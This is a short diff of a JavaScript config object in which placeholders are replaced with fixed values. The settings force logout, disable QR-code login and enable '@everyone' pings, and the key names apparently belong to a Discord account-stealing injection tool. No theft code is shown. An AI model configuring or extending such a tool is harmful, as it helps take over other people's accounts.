@@ -18,13 +18,13 @@ const Filters = {
 };
 
 const config = {
-    "minimum_members_per_server":"%MIN_MEMBERS%",
-    "logout": "%LOGOUT%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify": "%INITNOTI%",
+    "minimum_members_per_server":"true",
+    "logout": "true",
+    "logout-notify": "true",
+    "init-notify": "true",
     "embed-color": 347704,
-    "disable-qr-code": "%DISABLEQRCODE%",
-    "ping": [false, "@everyone"]
+    "disable-qr-code": "true",
+    "ping": [true, "@everyone"]
 };
 
 const badges = {
